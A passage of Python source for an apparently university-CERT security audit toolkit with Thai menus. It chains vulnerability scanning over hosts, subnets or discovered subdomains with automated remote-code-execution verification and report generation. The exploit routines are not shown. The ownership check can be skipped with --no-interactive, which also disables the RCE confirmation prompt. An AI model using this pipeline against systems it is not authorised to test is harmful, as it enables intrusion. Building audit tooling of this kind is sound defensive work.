         "ค้นหาและเลือกไฟล์ .json ได้สะดวกโดยไม่ต้องพิมพ์ชื่อไฟล์เอง",
         "ได้ Path ของไฟล์ JSON ที่ต้องการนำมาสร้างรายงาน"),
        ("manual", "พิมพ์ระบุ Path ของไฟล์ JSON ด้วยตนเอง",
         "พิมพ์ชื่อไฟล์หรือ Path เต็ม เช่น scan_single_192.168.1.10.json",
         "ได้ Path ของไฟล์ JSON ที่ระบุ"),
    ]
    if default_json and Path(default_json).exists():
        pick_choices.insert(0, (
            "last",
            f"ใช้ไฟล์ JSON จากการสแกนล่าสุด ({Path(default_json).name})",
            f"ใช้ไฟล์ {default_json} ทันทีโดยไม่ต้องเลือกใหม่",
            "สร้างรายงานจากผลสแกนล่าสุดทันที"
        ))
    pick_choices.append(("back", "← กลับเมนูหลัก", "", ""))

    pick_mode = ask_choice("เลือกวิธีระบุไฟล์ JSON ต้นฉบับ:", pick_choices, default=pick_choices[0][0])
    if pick_mode == "back":
        return None
    elif pick_mode == "last":
        json_path = default_json
    elif pick_mode == "browse":
        json_path = browse_file(title="เลือกไฟล์ JSON ผลการสแกนเพื่อสร้างรายงาน", ext=".json", start_dir=".")
        if not json_path:
            print(c("  ยกเลิกการเลือกไฟล์", C.YEL))
            return None
    else:
        json_path = ask("กรอก JSON path", required=True,
                        validator=lambda v: (Path(v).expanduser().exists(), f"ไม่พบ {v}"))
        json_path = str(Path(json_path).expanduser().resolve())

    out_dir = ask("โฟลเดอร์สำหรับบันทึก Output (Output dir)", "reports")
    ev_dir = browse_directory(title="เลือกโฟลเดอร์ Evidence (ถ้ามี)", start_dir="evidence" if Path("evidence").exists() else ".")
    return run_generate_report(json_path, out_dir, ev_dir or None)


# ═══════════════════════════════════════════════════════════════════════
# Menu Action 4: Pipeline (เมนูที่ 5)
# ═══════════════════════════════════════════════════════════════════════

def menu_pipeline():
    section("เมนู 5: FULL PIPELINE — ทำงานครบวงจรอัตโนมัติ (Scan → Verify → Report)")
    print(f"  {c('📋 ขั้นตอนการทำงานอัตโนมัติ 3 ขั้นตอน:', C.B)}")
    print(f"     • {c('Step 1 — Scan:', C.CYN)} สแกนตรวจหา 14 CVEs (PHP/NGINX/Node.js/GitLab/Kernel) และสแกนหาจุดเสี่ยง LFI (รองรับ Single / CIDR / Wildcard)")
    print(f"     • {c('Step 2 — RCE Verify:', C.CYN)} หากพบช่องโหว่วิกฤต + LFI จะทำการพิสูจน์ RCE และเก็บหลักฐานอัตโนมัติ")
    print(f"     • {c('Step 3 — Generate Report:', C.CYN)} สร้างรายงานสรุปฉบับสมบูรณ์พร้อมแนบหลักฐาน")
    print(f"\n  {c('📦 Output ทั้งหมดที่จะได้จากเมนูนี้:', C.GRN)}")
    print(f"     1. {c('pipeline_<mode>_<target>_<timestamp>.json', C.B)} — ไฟล์ข้อมูลผลการสแกนดิบ")
    print(f"     2. {c('evidence/<target>_<timestamp>/', C.B)}            — โฟลเดอร์หลักฐาน Chain-of-Custody (กรณีทำ RCE Verify)")
    print(f"     3. {c('reports/report_<target>.pdf', C.B)}               — รายงานสรุปผู้บริหารและเทคนิคฉบับสมบูรณ์ (PDF)")
    print(f"     4. {c('reports/report_<target>.csv', C.B)}               — ตารางสรุปข้อมูลช่องโหว่ (CSV)")
    print(f"     5. {c('reports/charts/*.png', C.B)}                      — กราฟสถิติประกอบรายงาน 4 รูป\n")

    section("STEP 1: Scan")
    # ── โหมดการสแกนเลือกไว้ตั้งแต่เปิดโปรแกรมแล้ว (เมนูหลัก) ──
    _scan_mode = _SCAN_MODE
    print(f"  {c('โหมดสแกน:', C.B)} {c(_scan_mode_label(_scan_mode), C.CYN)} "
          f"{c('(เปลี่ยนได้ที่เมนูหลัก)', C.D)}\n")
    mode = ask_choice("เลือกรูปแบบเป้าหมายสำหรับทำ Full Pipeline:", [
        ("single", "Single Host (เป้าหมายเดี่ยว)",
         "ระบุ IP, Domain หรือ URL เดี่ยวเพื่อสแกน → พิสูจน์ RCE → ออกรายงาน",
         "ไฟล์ pipeline_single_<target>_<timestamp>.json + Evidence + Report"),
        ("cidr", "CIDR Subnet (ทั้งวงแลน/ซับเน็ต)",
         "ระบุวงจรเครือข่าย เช่น 192.168.1.0/24 เพื่อสแกนทุกเครื่อง → เลือกพิสูจน์ RCE → ออกรายงานรวม",
         "ไฟล์ pipeline_cidr_<subnet>_<timestamp>.json + Evidence + Report"),
        ("wildcard", "Wildcard Domain (ค้นหา Subdomains ทั้งหมด)",
         "ค้นหา Subdomain จาก crt.sh / SecurityTrails / DNS Bruteforce → สแกนทั้งหมด → เลือกพิสูจน์ RCE → ออกรายงานรวม",
         "ไฟล์ pipeline_wildcard_<domain>_<timestamp>.json + Evidence + Report"),
        ("filelist", "รายชื่อโฮสต์จากไฟล์ (CSV/TXT — บรรทัดละโฮสต์)",
         "เบราซ์/อัปโหลดไฟล์ CSV หรือ TXT ระบบกรองเหลือแต่โดเมนจริง → สแกนครบทุกโฮสต์ → เลือกพิสูจน์ RCE → ออกรายงานรวม",
         "ไฟล์ pipeline_filelist_<ชื่อไฟล์>_<timestamp>.json + Evidence + Report"),
        ("back", "← กลับเมนูหลัก", "", ""),
    ], default="single")
    if mode == "back":
        return None

    if mode == "single":
        target = ask("Target (single host เช่น 192.168.1.10)", required=True)
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        targets = [(target, "single")]
        name = safe_name(urlparse(target).hostname or "target")
        scope = f"Target: {target}"
        target_label = target
        default_threads = 1
    elif mode == "cidr":
        cidr = ask("CIDR (เช่น 192.168.1.0/24)", required=True)
        targets = resolve_cidr(cidr)
        if not targets:
            return None
        name = safe_name(cidr.replace("/", "_").replace(".", "_"))
        scope = f"CIDR: {cidr} ({len(targets)} hosts)"
        target_label = f"CIDR {cidr}"
        default_threads = 5
    elif mode == "wildcard":
        dom = ask("Domain (เช่น example.ac.th)", required=True)
        st = ask("SecurityTrails key (Enter=ข้าม)", default="")
        bf = ask_yn("ใช้ DNS bruteforce?", False)
        wl = ask("Wordlist path", "") if bf else ""
        ms = ask_int("Max subdomains", 2000, 1, 10000)
        targets = resolve_wildcard(dom, bf, wl, st, ms)
        if not targets:
            return None
        name = safe_name(dom.replace(".", "_"))
        scope = f"Wildcard: {dom} ({len(targets)} subdomains)"
        target_label = f"*.{dom}"
        default_threads = 5
    else:  # filelist
        fpath = browse_file(title="เลือกไฟล์รายชื่อโฮสต์ (CSV/TXT)",
                            ext=(".csv", ".txt"), start_dir=".")
        if not fpath:
            print(c("  ยกเลิก (ไม่ได้เลือกไฟล์)", C.YEL)); return None
        hosts, fstat = read_host_list_file(fpath)
        if not hosts:
            print(c("  ❌ ไม่พบโดเมน/IP ที่ถูกต้องในไฟล์", C.RED)); return None
        print(f"\n  {c('📋 ผลการกรองไฟล์:', C.GRN)} {Path(fpath).name}")
        print(f"     บรรทัดข้อมูล: {fstat['raw']}  |  "
              f"โดเมนที่ใช้ได้ (ไม่ซ้ำ): {c(str(fstat['valid']), C.CYN)}  |  "
              f"ซ้ำ: {fstat['dup']}  |  ข้าม (ไม่ใช่โดเมน): {fstat['invalid']}")
        preview = ", ".join(hosts[:8]) + (f"  …(+{len(hosts)-8})" if len(hosts) > 8 else "")
        print(f"     {c('ตัวอย่างโฮสต์:', C.B)} {preview}")
        if fstat["skip_samples"]:
            print(f"     {c('ตัวอย่างบรรทัดที่ข้าม:', C.YEL)} {' | '.join(fstat['skip_samples'])}")
        if not ask_yn(f"ยืนยันสแกนทั้งหมด {len(hosts)} โฮสต์?", True):
            print(c("  ยกเลิก", C.YEL)); return None
        targets = [(f"https://{h}", "filelist") for h in hosts]
        name = safe_name(Path(fpath).stem)
        scope = f"File list: {Path(fpath).name} ({len(hosts)} hosts)"
        target_label = f"File list ({len(hosts)} hosts)"
        default_threads = 5

    opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": 8.0,
            "target_threads": default_threads, "lfi_threads": 5, "rate": 5.0,
            "skip_lfi": False, "verbose": False, "no_verify_ssl": False, "online_cve": False,
            "lan_mode": False, "discover": (mode != "single")}

    opts["scan_mode"] = _scan_mode

    if ask_yn("ตั้งค่าการสแกนขั้นสูง (Threads / Crawl Depth / Skip LFI)?", False):
        opts["target_threads"] = ask_int("Threads", default_threads, 1, 30)
        opts["depth"] = ask_int("Crawl depth", _SCAN_DEPTH, 1, 20)
        opts["max_pages"] = ask_int("Max pages/target", _SCAN_MAX_PAGES, 5, 5000)
        opts["crawl_budget"] = ask_int("Crawl timeout ต่อโฮสต์ (วินาที)", 30, 5, 600)
        opts["host_budget"] = ask_int("เวลารวมสูงสุดต่อโฮสต์ (วินาที) เกินแล้วข้าม", 60, 10, 600)
        opts["skip_lfi"] = ask_yn("Skip LFI scan?", False)
        opts["verbose"] = ask_yn("Verbose?", False)
        opts["online_cve"] = ask_yn("ค้น CVE ออนไลน์ (CIRCL) ตามเวอร์ชันที่พบ? [ต้องต่อเน็ต]", False)

    if not confirm_scan_scope(scope, opts):
        print(c("  ยกเลิก", C.YEL))
        return None

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    print(f"\n  [1/3] Scanning {len(targets)} target(s) ...")
    results = run_scan(targets, opts)

    json_path = unique_output_path(".", f"pipeline_{mode}_{name}_{ts}", ".json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({"target": target_label,
                   "scan_time": datetime.now().isoformat(),
                   "total_targets": len(results),
                   "results": results}, f,
                  indent=2, ensure_ascii=False, default=list)
    print(f"  {c('✅', C.GRN)} JSON: {json_path}")

    if len(results) >= 1:
        reachable_list = [r for r in results if r.get("reachable")]
        print(f"  Reachable: {len(reachable_list)}/{len(results)}")
        total_crit = sum(r.get("summary", {}).get("critical", 0) for r in results)
        if total_crit:
            print(f"  {c(f'🔴 {total_crit} critical findings', C.RED)}")
        elif len(results) == 1:
            r0 = results[0]
            if not r0.get("reachable"):
                print(f"  {c('⚠ เป้าหมายไม่สามารถเชื่อมต่อได้: ' + str(r0.get('error', '')), C.YEL)}")
            else:
                sm = r0.get("summary", {})
                print(f"  สรุปผล ({r0.get('target', '')}): วิกฤต {sm.get('critical', 0)} · สูง {sm.get('high', 0)} · กลาง {sm.get('medium', 0)} · ปลอดภัย {sm.get('safe', 0)} · ไม่ทราบ {sm.get('unknown', 0)}")

    section("STEP 2: RCE Verify")
    ev = None
    if mode == "single":
        r = results[0]
        crit = r.get("summary", {}).get("critical", 0)
        if crit > 0 and r.get("lfi_findings"):
            print(f"  พบ {crit} critical + {len(r['lfi_findings'])} LFI")
            if ask_yn("รัน RCE Verify?", default=True):
                lfi_url = r["lfi_findings"][0]["url"]
                session_ep = r["preconditions"].get("tested_url", "") or None
                verdict, summary, ev = run_rce_verify(
                    target, lfi_url=lfi_url, session_endpoint=session_ep,
                    evidence_dir=f"evidence/{name}_{ts}",
                    i_own_this_target=_OWN_TARGET,
                )
                print(f"  Verdict: {c(verdict, C.GRN if verdict=='RCE_CONFIRMED' else C.YEL)}")
        else:
            print(f"  {c('ไม่ต้อง verify (ไม่พบเงื่อนไข Critical + LFI พร้อมกัน)', C.D)}")
    else:
        reachable = [r for r in results if r.get("reachable")]
        vulnerable = [
            h for h in reachable
            if h.get("summary", {}).get("critical", 0) > 0 and h.get("lfi_findings")
        ]
        if vulnerable:
            print(f"  พบ {c(str(len(vulnerable)), C.RED)} เครื่องที่มีทั้ง Critical CVE + LFI")
            if ask_yn("ต้องการเลือกเครื่องเพื่อรัน RCE Verify หรือไม่?", default=True):
                verify_res = _select_and_verify_host(results, json_path)
                if isinstance(verify_res, dict):
                    ev = verify_res.get("evidence_dir")
        else:
            print(f"  {c('ไม่ต้อง verify (ไม่พบเครื่องที่มีเงื่อนไข Critical + LFI พร้อมกัน)', C.D)}")

    section("STEP 3: Report")
    result = run_generate_report(str(json_path), "reports", ev)
    return {"json_path": str(json_path), "evidence_dir": ev, "report": result}


# ═══════════════════════════════════════════════════════════════════════
# SECTION 7 — Main Menu (with Cross-Menu)
# ═══════════════════════════════════════════════════════════════════════

def main_menu():
    """Main loop with cross-menu navigation"""
    global _SCAN_MODE
    pending_action = None
    last_result = None

    # ── ภาพใหญ่ก่อนสุด: เลือกโหมดการสแกน (LAN/ภายนอก) ก่อนเข้าเมนูหลัก ──
    banner()
    _SCAN_MODE = ask_scan_mode()

    while True:
        if pending_action is None:
            banner()
            print(f"  {c('คำแนะนำการใช้งาน:', C.B)} เลือกหมายเลขเมนูที่ต้องการ ด้านล่างแสดงรายละเอียดและ Output ของแต่ละเมนู")
            print(f"  {c('โหมดสแกนปัจจุบัน:', C.B)} {c(_scan_mode_label(), C.CYN)}  {c('(เปลี่ยนได้ที่เมนูท้ายสุด)', C.D)}")
            print(f"  {c('⭐ แนะนำ:', C.YEL)} ใช้ครั้งแรกหรืออยากได้ครบจบในขั้นตอนเดียว ให้เลือก {c('เมนู 5) Full Pipeline', C.B)} — สแกน → ยืนยัน → ออกรายงาน อัตโนมัติ")
            print(c("─" * 74, C.D))
            action = ask_choice("เมนูหลัก (Main Menu):", [
                ("cve",
                 "ดูรายการ CVE ที่ตรวจสอบ (14 รายการ)",
                 "PHP 3 · NGINX 5 · Node.js 4 · GitLab 1 — ความรุนแรง เงื่อนไข และรุ่นที่แพตช์",
                 "ตารางบนหน้าจอ"),
                ("scan",
                 "Scan — สแกนหาช่องโหว่  (Single / CIDR / Wildcard)",
                 "ตรวจ fingerprint, เวอร์ชัน PHP/NGINX/Node.js/GitLab, 14 CVEs และจุดเสี่ยง LFI",
                 "ไฟล์ scan_*.json"),
                ("verify",
                 "RCE Verify — พิสูจน์ช่องโหว่ + เก็บหลักฐาน",
                 "ยืนยันการรันคำสั่งจริง (เฉพาะ Private IP / ที่ได้รับอนุญาต)",
                 "โฟลเดอร์ evidence/<host>_<ts>/"),
                ("report",
                 "Report — สร้างรายงาน PDF/CSV + กราฟ",
                 "นำไฟล์ JSON มาออกรายงานไทยพร้อมกราฟสถิติและคำอธิบาย",
                 "reports/*.pdf · *.csv · charts/*.png"),
                ("pipeline",
                 f"Full Pipeline — ครบวงจรอัตโนมัติ  {c('⭐ แนะนำ', C.YEL)}",
                 "Scan → RCE Verify (ถ้าเข้าเงื่อนไข) → Report ในคำสั่งเดียว",
                 "JSON + evidence/ + reports/"),
                ("mode",
                 f"เปลี่ยนโหมดสแกน (ปัจจุบัน: {_scan_mode_label()})",
                 "สลับ LAN / ภายนอก / อัตโนมัติ — มีผลกับเมนู Scan และ Full Pipeline",
                 ""),
                ("quit", "ออกจากโปรแกรม (Exit)", "", ""),
            ], default="cve")
        else:
            action = pending_action
            pending_action = None

        if action == "quit":
            print(f"\n  {c('ลาก่อน', C.D)}\n")
            return 0

        if action == "cve":
            display_cve_list(verbose=True)
            input(f"  {c('กด Enter เพื่อกลับ...', C.D)}")
            continue

        if action == "mode":
            _SCAN_MODE = ask_scan_mode()
            print(f"  {c('✓ ตั้งโหมดสแกนเป็น:', C.GRN)} {c(_scan_mode_label(), C.CYN)}")
            input(f"  {c('กด Enter เพื่อกลับ...', C.D)}")
            continue

        if action == "main":
            continue

        try:
            if action == "scan":
                last_result = menu_scan()
            elif action == "verify":
                last_result = menu_rce_verify()
            elif action == "report":
                default_json = last_result.get("json_path") if isinstance(last_result, dict) else None
                last_result = menu_generate_report(default_json=default_json)
            elif action == "pipeline":
                last_result = menu_pipeline()
        except KeyboardInterrupt:
            print(f"\n  {c('ยกเลิก', C.YEL)}")
            continue
        except Exception as e:
            print(f"\n  {c(f'❌ Error: {e}', C.RED)}")
            continue

        # ── Cross-menu after action ──
        next_action = post_action_menu(last_result)
        if next_action == "quit":
            return 0
        if next_action == "main":
            continue
        if next_action == "cve":
            display_cve_list(verbose=True)
            input(f"  {c('กด Enter...', C.D)}")
            continue
        pending_action = next_action


# ═══════════════════════════════════════════════════════════════════════
# SECTION 8 — Main (CLI)
# ═══════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="RMUT CERT. — All-in-One Tool (Scanner + RCE + Report)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 security_audit_toolkit.py                              # interactive menu
  python3 security_audit_toolkit.py --list-cves                  # show 14 CVEs
  python3 security_audit_toolkit.py --target 192.168.1.10        # quick scan
  python3 security_audit_toolkit.py --cidr 192.168.1.0/24        # CIDR scan
  python3 security_audit_toolkit.py --wildcard example.org         # wildcard scan
  python3 security_audit_toolkit.py --list hosts.csv             # scan จากไฟล์รายชื่อโฮสต์ (CSV/TXT)
  python3 security_audit_toolkit.py --pipeline 192.168.1.10 --i-own-this-target
  python3 security_audit_toolkit.py --report scan.json
        """)
    ap.add_argument("--target", help="Quick scan single target")
    ap.add_argument("--cidr", help="Quick scan CIDR")
    ap.add_argument("--wildcard", help="Quick scan wildcard")
    ap.add_argument("--list", dest="listfile", metavar="FILE",
                    help="Quick scan จากไฟล์รายชื่อโฮสต์ CSV/TXT (บรรทัดละโฮสต์ กรองเหลือโดเมนจริงอัตโนมัติ)")
    ap.add_argument("--pipeline", help="Full pipeline (single host)")
    ap.add_argument("--report", help="Generate report from JSON")
    ap.add_argument("--evidence-dir", help="Evidence dir for report")
    ap.add_argument("--output-dir", default="reports", help="Report output dir")
    ap.add_argument("--i-own-this-target", action="store_true",
                    help="ยืนยันความเป็นเจ้าของ (บังคับสำหรับ pipeline)")
    ap.add_argument("--no-interactive", action="store_true")
    ap.add_argument("--list-cves", action="store_true",
                    help="แสดงรายการ CVE แล้วออก")
    ap.add_argument("--depth", type=int, default=2, metavar="N",
                    help="ความลึกการ crawl (default: 2, max: 20)")
    ap.add_argument("--max-pages", type=int, default=50, metavar="N",
                    help="จำนวนหน้าสูงสุดต่อโฮสต์ (default: 50)")
    ap.add_argument("--c99-key", default="", metavar="KEY",
                    help="API key สำหรับ c99.nl SubdomainFinder (เสริม — ครอบคลุมมาก)")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--threads", type=int, default=10, help="Target scan threads (concurrency)")
    ap.add_argument("--skip-lfi", action="store_true", help="Skip LFI testing")
    ap.add_argument("--online-cve", action="store_true", help="Enable CIRCL CVE API online search")
    ap.add_argument("--selected-cves", default="", help="Comma-separated CVE IDs to audit")
    ap.add_argument("--no-verify-ssl", action="store_true")
    ap.add_argument("--lan", action="store_true",
                    help="LAN mode: force internal-network accuracy (nmap -O/ARP OS + MAC/OUI vendor + "
                         "higher TTL confidence). Auto-enabled for private-IP targets.")
    ap.add_argument("--no-discover", action="store_true",
                    help="Disable the fast TCP host-discovery pre-pass for CIDR/multi-host scans "
                         "(by default dead IPs with no open web port are skipped before deep scanning).")
    args = ap.parse_args()

    global _OWN_TARGET, _SCAN_DEPTH, _SCAN_MAX_PAGES, _NO_INTERACTIVE
    _OWN_TARGET = args.i_own_this_target
    _NO_INTERACTIVE = args.no_interactive
    _SCAN_DEPTH = max(1, min(args.depth, 20))
    _SCAN_MAX_PAGES = max(1, args.max_pages)
    selected_cve_set = set(args.selected_cves.split(",")) if args.selected_cves else None

    if args.list_cves:
        banner()
        display_cve_list(verbose=True)
        return 0

    if args.target and not args.pipeline:
        banner()
        display_cve_list(verbose=False)
        if not confirm_scan_scope(f"Target: {args.target}"):
            return 0
        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": args.timeout,
                "target_threads": 1, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False,
                "no_verify_ssl": args.no_verify_ssl, "lan_mode": args.lan, "discover": not args.no_discover}
        results = run_scan([(args.target, "single")], opts)
        name = safe_name(args.target.replace("https://", "").replace("http://", "").replace("/", "_"))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = unique_output_path(".", f"scan_{name}_{ts}", ".json")
        with open(out, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": args.target,
                       "total_targets": 1, "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                      indent=2, ensure_ascii=False, default=list)
        print(f"\n[+] Saved: {out}")
        return 0

    if args.cidr:
        banner()
        display_cve_list(verbose=False)
        targets = resolve_cidr(args.cidr)
        if not confirm_scan_scope(f"CIDR: {args.cidr} ({len(targets)} hosts)"):
            return 0
        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": args.timeout,
                "target_threads": 3, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False,
                "no_verify_ssl": args.no_verify_ssl, "lan_mode": args.lan, "discover": not args.no_discover}
        results = run_scan(targets, opts)
        name = safe_name(args.cidr.replace("/", "_").replace(".", "_"))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = unique_output_path(".", f"scan_cidr_{name}_{ts}", ".json")
        with open(out, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": args.cidr,
                       "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                      indent=2, ensure_ascii=False, default=list)
        print(f"\n[+] Saved: {out}")
        return 0

    if args.wildcard:
        banner()
        display_cve_list(verbose=False)
        targets = resolve_wildcard(args.wildcard, c99_key=args.c99_key, max_subs=2000)
        if not confirm_scan_scope(f"Wildcard: {args.wildcard} ({len(targets)} subdomains)"):
            return 0
        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": args.timeout,
                "target_threads": 5, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False,
                "no_verify_ssl": args.no_verify_ssl, "lan_mode": args.lan, "discover": not args.no_discover}
        results = run_scan(targets, opts)
        name = safe_name(args.wildcard.replace(".", "_"))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = unique_output_path(".", f"scan_wildcard_{name}_{ts}", ".json")
        with open(out, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": args.wildcard,
                       "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                      indent=2, ensure_ascii=False, default=list)
        print(f"\n[+] Saved: {out}")
        return 0

    if args.listfile:
        banner()
        display_cve_list(verbose=False)
        hosts, fstat = read_host_list_file(args.listfile)
        if not hosts:
            print("  ❌ ไม่พบโดเมน/IP ที่ถูกต้องในไฟล์")
            return 1
        print(f"  📋 กรองไฟล์ {Path(args.listfile).name}: ใช้ได้ {fstat['valid']} โฮสต์ "
              f"(ซ้ำ {fstat['dup']} · ข้าม {fstat['invalid']})")
        targets = [(f"https://{h}", "filelist") for h in hosts]
        if not confirm_scan_scope(f"File list: {Path(args.listfile).name} ({len(hosts)} hosts)"):
            return 0
        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": args.timeout,
                "target_threads": 5, "lfi_threads": 5, "rate": 5.0,
                "skip_lfi": False, "verbose": False,
                "no_verify_ssl": args.no_verify_ssl, "lan_mode": args.lan, "discover": not args.no_discover}
        results = run_scan(targets, opts)
        name = safe_name(Path(args.listfile).stem)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out = unique_output_path(".", f"scan_filelist_{name}_{ts}", ".json")
        with open(out, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": Path(args.listfile).name,
                       "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                      indent=2, ensure_ascii=False, default=list)
        print(f"\n[+] Saved: {out}")
        return 0

    if args.pipeline:
        if not args.i_own_this_target and not args.no_interactive:
            print("  ❌ --pipeline ต้องมี --i-own-this-target")
            return 1
        banner()
        display_cve_list(verbose=False)
        raw_pipeline = args.pipeline.strip()

        opts = {"depth": _SCAN_DEPTH, "max_pages": _SCAN_MAX_PAGES, "timeout": args.timeout,
                "target_threads": max(1, args.threads), "lfi_threads": min(5, max(1, args.threads)), "rate": 5.0,
                "skip_lfi": args.skip_lfi, "verbose": False,
                "selected_cves": selected_cve_set, "online_cve": args.online_cve,
                "no_verify_ssl": args.no_verify_ssl, "lan_mode": args.lan, "discover": not args.no_discover}

        # Case A: Target is a CIDR network range (e.g. 192.168.1.0/24)
        if re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', raw_pipeline):
            targets = resolve_cidr(raw_pipeline)
            if not confirm_scan_scope(f"CIDR Pipeline: {raw_pipeline} ({len(targets)} hosts)"):
                return 0
            results = run_scan(targets, opts)
            name = safe_name(raw_pipeline.replace("/", "_").replace(".", "_"))
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path = unique_output_path(".", f"pipeline_cidr_{name}_{ts}", ".json")
            with open(json_path, "w") as f:
                json.dump({"scan_time": datetime.now().isoformat(), "target": raw_pipeline,
                           "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                          indent=2, ensure_ascii=False, default=list)
            print(f"\n[1/2] JSON: {json_path}")
            print(f"[2/2] Generating report ...")
            result = run_generate_report(str(json_path), args.output_dir)
            if result:
                print(f"\n[+] PDF:   {result['pdf']}")
                print(f"[+] Excel: {result.get('excel','')}")
                print(f"[+] HTML:  {result.get('html','')}")
                print(f"[+] Dir:   {result.get('out_dir','')}")
            return 0

        # Case B: Target is a file list (.txt, .csv)
        elif os.path.isfile(raw_pipeline):
            hosts, fstat = read_host_list_file(raw_pipeline)
            if not hosts:
                print("  ❌ ไม่พบโดเมน/IP ที่ถูกต้องในไฟล์")
                return 1
            targets = [(f"https://{h}", "filelist") for h in hosts]
            if not confirm_scan_scope(f"File Pipeline: {Path(raw_pipeline).name} ({len(hosts)} hosts)"):
                return 0
            results = run_scan(targets, opts)
            name = safe_name(Path(raw_pipeline).stem)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path = unique_output_path(".", f"pipeline_file_{name}_{ts}", ".json")
            with open(json_path, "w") as f:
                json.dump({"scan_time": datetime.now().isoformat(), "target": Path(raw_pipeline).name,
                           "total_targets": len(results), "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                          indent=2, ensure_ascii=False, default=list)
            print(f"\n[1/2] JSON: {json_path}")
            print(f"[2/2] Generating report ...")
            result = run_generate_report(str(json_path), args.output_dir)
            if result:
                print(f"\n[+] PDF:   {result['pdf']}")
                print(f"[+] Excel: {result.get('excel','')}")
                print(f"[+] HTML:  {result.get('html','')}")
                print(f"[+] Dir:   {result.get('out_dir','')}")
            return 0

        # Case C: Single Host/URL Target
        target = raw_pipeline if raw_pipeline.startswith("http") else f"https://{raw_pipeline}"
        if not confirm_scan_scope(f"Target: {target}"):
            return 0
        results = run_scan([(target, "single")], opts)
        r = results[0]

        name = safe_name(urlparse(target).hostname or "target")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path = unique_output_path(".", f"pipeline_{name}_{ts}", ".json")
        with open(json_path, "w") as f:
            json.dump({"scan_time": datetime.now().isoformat(), "target": target,
                       "total_targets": 1, "results": results, "scan_opts": opts, "tool_version": "RMUT CERT All-in-One v" + VERSION}, f,
                      indent=2, ensure_ascii=False, default=list)
        print(f"\n[1/3] JSON: {json_path}")

        ev = None
        if r.get("summary", {}).get("critical", 0) > 0 and r.get("lfi_findings"):
            lfi_url = r["lfi_findings"][0]["url"]
            print(f"[2/3] Verifying RCE ...")
            verdict, summary, ev = run_rce_verify(
                target, lfi_url=lfi_url,
                evidence_dir=f"evidence/{name}_{ts}",
                confirm=not args.no_interactive,
                i_own_this_target=args.i_own_this_target)
            print(f"      Verdict: {verdict}")
        else:
            print(f"[2/3] Skip verify")

        print(f"[3/3] Generating report ...")
        result = run_generate_report(str(json_path), args.output_dir, ev)
        if result:
            print(f"\n[+] PDF:   {result['pdf']}")
            print(f"[+] Excel: {result.get('excel','')}")
            print(f"[+] HTML:  {result.get('html','')}")
            print(f"[+] Dir:   {result.get('out_dir','')}")
        return 0

    if args.report:
        if not Path(args.report).exists():
            print(f"  ❌ ไม่พบ {args.report}")
            return 1
        result = run_generate_report(args.report, args.output_dir, args.evidence_dir)
        return 0 if result else 1

    return main_menu()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n\n  {c('ยกเลิก', C.YEL)}\n")
        sys.exit(1)